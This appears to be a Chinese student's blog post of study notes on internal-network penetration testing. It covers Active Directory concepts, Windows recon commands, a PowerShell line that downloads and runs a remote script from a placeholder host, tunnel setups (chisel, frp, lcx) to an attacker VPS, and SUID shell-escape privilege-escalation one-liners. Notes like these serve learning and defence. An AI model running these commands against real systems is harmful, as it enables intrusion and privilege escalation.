<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="前言其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍(后续:看到第三章就不行了，但是大概知道内网是怎么一回事了)，在此简单记录">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透学习">
<meta property="og:url" content="https://mayylu.github.io/2024/03/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="mayylu">
<meta property="og:description" content="前言其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍(后续:看到第三章就不行了，但是大概知道内网是怎么一回事了)，在此简单记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png">
<meta property="article:published_time" content="2024-03-10T04:44:19.000Z">
<meta property="article:modified_time" content="2024-03-29T15:43:15.539Z">
<meta property="article:author" content="mayylu">
<meta property="article:tag" content="server">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png">


<link rel="canonical" href="https://mayylu.github.io/2024/03/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2024/03/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/","path":"2024/03/10/server/内网渗透学习/","title":"内网渗透学习"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>内网渗透学习 | mayylu</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">mayylu</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">2.</span> <span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-DC"><span class="nav-number">2.1.</span> <span class="nav-text">域控制器(DC)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD"><span class="nav-number">2.2.</span> <span class="nav-text">活动目录(AD)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84"><span class="nav-number">2.3.</span> <span class="nav-text">组</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">本机基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.2.</span> <span class="nav-text">域内基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.3.</span> <span class="nav-text">内网资源探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.3.1.</span> <span class="nav-text">发现内网存活主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.3.2.</span> <span class="nav-text">内网端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">Nmap进行端口扫描</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="nav-number">3.3.3.</span> <span class="nav-text">收集用户凭证</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BloodHound"><span class="nav-number">3.4.</span> <span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">4.</span> <span class="nav-text">内网穿透与端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="nav-number">4.1.</span> <span class="nav-text">ssh隧道搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lcx"><span class="nav-number">4.2.</span> <span class="nav-text">lcx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chisel"><span class="nav-number">4.3.</span> <span class="nav-text">chisel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">4.4.</span> <span class="nav-text">frp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.</span> <span class="nav-text">SUID提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.</span> <span class="nav-text">脏牛提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-UDF%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.1.</span> <span class="nav-text">mysql UDF提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91"><span class="nav-number">6.</span> <span class="nav-text">域内横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IPC-amp-at-amp-schticks"><span class="nav-number">6.1.</span> <span class="nav-text">IPC$ &amp; at &amp; schticks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#at-amp-schtasks-%E4%BD%BF%E7%94%A8"><span class="nav-number">6.1.1.</span> <span class="nav-text">at &amp; schtasks 使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-Kerberos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE"><span class="nav-number">6.2.</span> <span class="nav-text">windows Kerberos身份认证协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="nav-number">6.2.1.</span> <span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HASH%E4%BC%A0%E9%80%92%EF%BC%88PTH%EF%BC%89"><span class="nav-number">6.2.1.1.</span> <span class="nav-text">HASH传递（PTH）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-number">6.2.1.2.</span> <span class="nav-text">域内用户枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="nav-number">6.2.1.3.</span> <span class="nav-text">密码喷洒</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AS-REP-Roasting"><span class="nav-number">6.2.1.4.</span> <span class="nav-text">AS-REP Roasting</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.2.1.5.</span> <span class="nav-text">黄金票据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="nav-number">6.2.2.</span> <span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A7%94%E6%89%98%E6%94%BB%E5%87%BB"><span class="nav-number">6.2.2.1.</span> <span class="nav-text">委托攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.2.2.2.</span> <span class="nav-text">白银票据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="nav-number">6.2.3.</span> <span class="nav-text">第三部分</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">mayylu</p>
  <div class="site-description" itemprop="description">学习是一种生活态度</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2024/03/10/server/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mayylu">
      <meta itemprop="description" content="学习是一种生活态度">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mayylu">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          内网渗透学习
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-03-10 12:44:19" itemprop="dateCreated datePublished" datetime="2024-03-10T12:44:19+08:00">2024-03-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2024-03-29 23:43:15" itemprop="dateModified" datetime="2024-03-29T23:43:15+08:00">2024-03-29</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我大一下的时候就知道有内网渗透这个东西了，但是鉴于我个人比较懒再加上内网对于我这种学生实在是过于遥远，所以一直搁浅的，自己其实也是一直憧憬大佬说的cs msf这些听起来很nb的东西，所以打算跟着MS08067写的内网实战指南过一遍(后续:看到第三章就不行了，但是大概知道内网是怎么一回事了)，在此简单记录</p>
<span id="more"></span>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h3><p>域控制器是域环境中核心的服务器计算机，用于在域中响应安全身份验证请求，负责允许或拒绝发出请求<br>的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息并执行域的安全策略等。</p>
<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h3><p>活动目录是一种目录服务数据库，区别于常见的关系型数据库。目录数据库实现是目录服务，是一个帮助<br>用户快速，准确地从目录中找到所需要信息的服务。目录数据库将所有数据库组织成一个有层次的树状结<br>构，其中的每一个节点是一个对象，用户可以根据这个对象名称去查找这个对象的有关信息。<br>如果那台机器装了AD他就变成DC</p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>组(group) 是用户账户的集合，按照用途，可以分为通讯组和安全组。<br>安全组分为：</p>
<ol>
<li>域本地组 域本地组主要用于本域内资源的访问权限</li>
<li>通用组   可以在该域林的任何域中指派权限，适合在域森林内的跨域访问中使用。</li>
<li>全局组   全局组只能包含本域内的用户账户</li>
</ol>
<p>域用户位于域的全局组Domain Users中，而计算机本地用户账户位于本地User组中。<br>当计算机 加入域时，全局组Domain Users会被添加到计算机本地的User组中。因此，域用户可以再域中的任何一台计算机上登录。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一般实战都是直接上传fscan</p>
<h3 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">systeminfo    #查看操作系统信息 </span><br><span class="line">whoami /all   #查看当前用户，权限</span><br><span class="line"></span><br><span class="line">ipconfig /all #查看网络配置信息,linux是ifconfig</span><br><span class="line">netstat -ano  #查看端口连接信息</span><br><span class="line">route print   #查看主机路由信息</span><br><span class="line"></span><br><span class="line">tasklist      #查看当前进程</span><br><span class="line"></span><br><span class="line">net use       # 查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session   #查看当前主机与所连接的客户端之间的会话, 注意这里需要管理权限</span><br><span class="line">net share                             # 查看本地开启的共享</span><br><span class="line">net share ipc$                        # 开启ipc$共享</span><br><span class="line">net share ipc$ /del                   # 删除ipc$共享</span><br><span class="line">net share admin$ /del                 # 删除admin$共享</span><br><span class="line">net share c$ /del                     # 删除C盘共享</span><br><span class="line"></span><br><span class="line">net user      #查看本地用户/组信息</span><br><span class="line">net user &lt;用户名&gt; &lt;密码&gt; /add</span><br><span class="line">net user &lt;用户名&gt; /delete</span><br></pre></td></tr></table></figure>
<h3 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net config workstation   #判断是否存在域环境</span><br><span class="line">net time /domain</span><br><span class="line">net user /domain         #域用户信息</span><br><span class="line">net group /domain        #列出域内所有用户组</span><br><span class="line">net accounts /domain     #域内密码策略</span><br><span class="line">nltest /DCLIST:域名      #查询所有的域控制器的主机名</span><br><span class="line">nltest /domain_trusts    #查看域信任关系</span><br></pre></td></tr></table></figure>
<h3 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h3><h4 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ICMP探测</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; #对网段循环ping</span><br><span class="line"><span class="meta">#</span><span class="bash">使用powershell脚本进行arp探测</span></span><br><span class="line">set-executionpolicy remotesigned；</span><br><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 192.168.92.1/24</span><br><span class="line">powshell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.92.1/24&quot; #也可以将脚本托管在服务器上，并通过powshell远程加载运行</span><br></pre></td></tr></table></figure>
<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">简单测试指定的端口号</span></span><br><span class="line">nc ip port</span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash">利用MetaSploite探测内网</span></span><br><span class="line">msfconsole</span><br><span class="line">search auxiliary/scanner </span><br></pre></td></tr></table></figure>

<h5 id="Nmap进行端口扫描"><a href="#Nmap进行端口扫描" class="headerlink" title="Nmap进行端口扫描"></a>Nmap进行端口扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR [目标] #当目标主机与我们处于同一个网段的时候，使用ARP协议扫描技术就是最佳的选择</span><br><span class="line">nmap -PE [目标] #通过ICMP响应请求和应答进行主机发现</span><br><span class="line">nmap -sU [目标] #基于UDP协议</span><br><span class="line">nmap -sS [目标] #TCP SYN扫描</span><br><span class="line">nmap -sA [目标] #TCP ACK扫描</span><br><span class="line">nmap -sF [目标] #TCP FIN扫描</span><br><span class="line">nmap -sT [目标] # TCP Connect扫描(完成了三次握手)</span><br><span class="line">nmap -sV [目标] #版本扫描</span><br></pre></td></tr></table></figure>

<h4 id="收集用户凭证"><a href="#收集用户凭证" class="headerlink" title="收集用户凭证"></a>收集用户凭证</h4><p><strong>SAM文件</strong>是Windows用户的账户数据库,位于%SystemRoot%\System32\Config目录中,所有本地用户的用户名, 密码的哈希值等信息都被存放在这个数据库文件中.</p>
<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><h2 id="内网穿透与端口转发"><a href="#内网穿透与端口转发" class="headerlink" title="内网穿透与端口转发"></a>内网穿透与端口转发</h2><h3 id="ssh隧道搭建"><a href="#ssh隧道搭建" class="headerlink" title="ssh隧道搭建"></a>ssh隧道搭建</h3><p><code>ssh -L 8085:172.2.118.5:80 ctfshow@pwn.challenge.ctf.show -p 28259</code><br>ctfshow上的题,直接在本地运行即可，作用是通过ssh连接，把内网的172.2.118.5:80映射到本地127.0.0.1:8085</p>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe，Linux版为portmap</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"> 功能和上面一样</span></span><br></pre></td></tr></table></figure>
<h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p>前面这几个一次只能转发一个端口,这个可以和proxychains4配合实现，内网kail打内网环境</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse #在vps上运行</span><br><span class="line">./chisel client vpsip:1234 R:0.0.0.0:9383:socks #1234是建立连接的端口，9383是你设置的代理端口，代理ip还是你自己vps ip</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 vpsip 9383</span><br><span class="line">proxychains4 msfconsole #使用proxychains4代理运行程序</span><br></pre></td></tr></table></figure>
<p>proxychains4还能让kail科学上网这里不再赘述</p>
<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">外</span></span><br><span class="line">[common]</span><br><span class="line"><span class="meta">#</span><span class="bash"> frp监听的端口，默认是7000，可以改成其他的</span></span><br><span class="line">bind_port = 7000</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">内</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = vps_ip #你自己vps的外网ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[RDP]   #这里演示的是远程桌面协议的端口转发</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389   #要转发的端口</span><br><span class="line">remote_port = 6000  #转发到外网ip的什么端口</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">ls -al /usr/bin/su</span><br><span class="line"><span class="meta">#</span><span class="bash">常用提权方式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">find</span></span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br><span class="line"><span class="meta">#</span><span class="bash">cp mv</span></span><br><span class="line"><span class="meta">#</span><span class="bash">覆盖 /etc/shadow 或 /etc/passwd</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap（2.02-5.21）存在交换模式，可利用提权</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash">vi/vim</span></span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">bash</span></span><br><span class="line">bash -p</span><br><span class="line"><span class="meta">#</span><span class="bash">less more</span></span><br><span class="line">less /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

